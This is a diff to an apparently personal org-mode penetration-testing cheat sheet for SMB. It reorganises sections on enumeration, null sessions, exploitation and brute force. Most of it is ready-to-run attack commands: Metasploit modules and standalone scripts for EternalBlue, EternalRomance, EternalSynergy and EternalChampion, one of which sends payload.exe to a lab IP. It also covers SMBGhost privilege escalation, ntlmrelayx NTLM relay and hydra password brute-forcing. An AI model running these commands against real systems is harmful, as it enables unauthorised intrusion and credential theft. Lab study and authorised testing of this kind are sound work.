@@ -9,21 +9,18 @@
 | SMB 3.1.1 present    | Medium   | SMBGhost (CVE-2020-0796)   |
 
 * Enumeration
+** Enumerate Host
+#+begin_src bash
+nxc smb $IP
+enum4linux -a $IP
+#+end_src
+
 ** Check EternalBlue
 #+begin_src bash
 nmap --script smb-vuln-ms17-010 -p 445 $IP
 #+end_src
 
-** Check Shares
-Without Credentials
-#+begin_src bash
-nmap --script=smb-enum-shares -p139,445 $IP
-smbmap -H $IP
-smbclient -L //$IP -N
-nxc smb $IP -u '' -p '' --shares
-#+end_src
-
-With Credentials
+** Enumerate Shares (with credenials)
 #+begin_src bash
 # List shares with credentials  
 smbclient -L //target.com -U username%password  
@@ -38,35 +35,25 @@ smbmap -H target.com -u username -p password
 smbmap -H target.com -u username -p password -r
 #+end_src
 
-** Null Session Enumeration
+** Enumerate Shares (without credentials)
 #+begin_src bash
+nmap --script=smb-enum-shares -p139,445 $IP
+smbmap -H $IP
 smbclient -L //$IP -N
-
-enum4linux -a $IP
-
+nxc smb $IP -u 'guest' -p '' --shares
 crackmapexec smb $IP --shares
-
-rpcclient -U "" -N $IP
-
-nxc smb $IP -u '' -p ''
-
-smbmap -H $IP -u "" -p ""
+#+end_src
+** Enumerate Files (Connect to share)
+#+begin_src bash
+smbclient //$IP/<share> -N
+# Get share permissions
+netexec smb $IP -u 'guest' -p '' -M spider_plus
 #+end_src
 
 ** Enumerate Hostname / NetBIOS-Name
 #+begin_src bash
 nmblookup -A $IP
-
 nxc smb $IP
-#+end_src
-
-** Enumerate General Information / Users
-#+begin_src bash
-nmap -p 445 --script smb-enum-all $IP
-
-enum4linux -a $IP
-
-enum4linux-ng.py -A $IP
 #+end_src
 
 * Exploitation
@@ -78,7 +65,8 @@ enum4linux-ng.py -A $IP
 | EternalSynergy  | Similar to Romance, newer targets     | ~ms17_010_psexec~      |
 | EternalChampion | Transaction2 race condition           | AutoBlue PoC           |
 
-** Priority Order
+** CVEs
+*** Priority Order
 #+BEGIN_EXAMPLE
 1.  nmap smb-vuln-ms17-010  →  if VULNERABLE, pick by OS:
     ├─ Win XP / 2003         →  EternalChampion (eternalblue_exploit2.py)
@@ -90,8 +78,8 @@ enum4linux-ng.py -A $IP
 4.  nmap smb-vuln-cve-2020-0796 → if VULNERABLE → SMBGhost
 5.  Always try               →  Null session enum (no creds needed)
 #+END_EXAMPLE
-
-** EternalBlue - MS17-010 (SMB 1.0)
+*** MS08-067 (Netapi)
+*** MS17-010 (EternalBlue) (SMB 1.0)
 #+begin_src text
 Requires: SMB 1.0 enabled + unpatched target
 #+end_src
@@ -104,7 +92,7 @@ set LHOST <your-ip>
 run
 #+end_src
 
-** EternalRomance - MS17-010 (SMB 1.0, x86/x64)
+*** MS17-010 (EternalRomance) (SMB 1.0, x86/x64)
 #+BEGIN_SRC text
 Requires: SMB 1.0 + unpatched Windows (XP/Vista/7/Server 2003-2008 R2)
 Targets:  Named pipe (browser, spoolss, netlogon) — more reliable than EternalBlue
@@ -123,7 +111,7 @@ git clone https://github.com/helviojunior/MS17-010
 python send_and_execute.py 192.168.150.10 payload.exe
 #+END_SRC
 
-** EternalSynergy - MS17-010 (SMB 1.0, Win 8+)
+*** MS17-010 (EternalSynergy) (SMB 1.0, Win 8+)
 #+BEGIN_SRC text
 Requires: SMB 1.0 + Windows 8 / Server 2012 and later (newer targets)
 Advantage: Specifically designed for targets where EternalBlue fails
@@ -142,7 +130,7 @@ run
 nmap -O -p 445 192.168.150.10
 #+END_SRC
 
-** EternalChampion - MS17-010 (SMB 1.0, Transaction2)
+*** MS17-010 (EternalChampion) (SMB 1.0, Transaction2)
 #+BEGIN_SRC text
 Requires: SMB 1.0 — exploits Transaction2 request race condition
 Targets:  Windows XP → Server 2008 R2 (x86/x64)
@@ -164,6 +152,18 @@ python eternalblue_exploit7.py 192.168.150.10 shellcode/sc_x64.bin   # Win7/2008
 python eternalblue_exploit2.py 192.168.150.10 shellcode/sc_x64.bin   # XP/2003
 #+END_SRC
 
+*** CVE-2020-0796 (SMBGhost) (SMB 3.1.1)
+#+BEGIN_SRC text
+Requires: SMB 3.1.1 + compression enabled (Windows 10 1903-1909)
+#+END_SRC
+#+BEGIN_SRC bash
+# Check if vulnerable
+nmap --script smb-vuln-cve-2020-0796 -p 445 192.168.150.10
+ 
+# Metasploit (local privesc variant)
+use exploit/windows/local/cve_2020_0796_smbghost
+#+END_SRC
+
 ** NTLM Relay (Signing not required)
 #+BEGIN_SRC text
 Requires: Signing disabled + active auth on the network
@@ -179,24 +179,35 @@ ntlmrelayx.py -t smb://192.168.150.10 -smb2support
 ntlmrelayx.py -t smb://192.168.150.10 -smb2support -i
 #+END_SRC
  
-** SMBGhost - CVE-2020-0796 (SMB 3.1.1)
-#+BEGIN_SRC text
-Requires: SMB 3.1.1 + compression enabled (Windows 10 1903-1909)
-#+END_SRC
-#+BEGIN_SRC bash
-# Check if vulnerable
-nmap --script smb-vuln-cve-2020-0796 -p 445 192.168.150.10
- 
-# Metasploit (local privesc variant)
-use exploit/windows/local/cve_2020_0796_smbghost
-#+END_SRC
+** Null Session
 
-** Null Session - Share Access
+Share Access
 #+BEGIN_SRC bash
 smbclient //$IP/<SHARE> -N
 # Browse and grab files
 get <file>
 #+END_SRC
+
+Enumerate Shares
+#+begin_src bash
+rpcclient -U "" -N $IP
+
+smbclient -L //$IP -N
+
+nxc smb $IP -u '' -p ''
+
+smbmap -H $IP -u "" -p ""
+#+end_src
+
+** Brute Force
+
+#+begin_src bash
+# with password list
+hydra -l administrator -P passwords.txt smb://$IP
+
+# with username list
+hydra -L users.txt -P passwords.txt smb://$IP
+#+end_src
 
 * Post-Exploitation
 /What to do after relay/shell?/
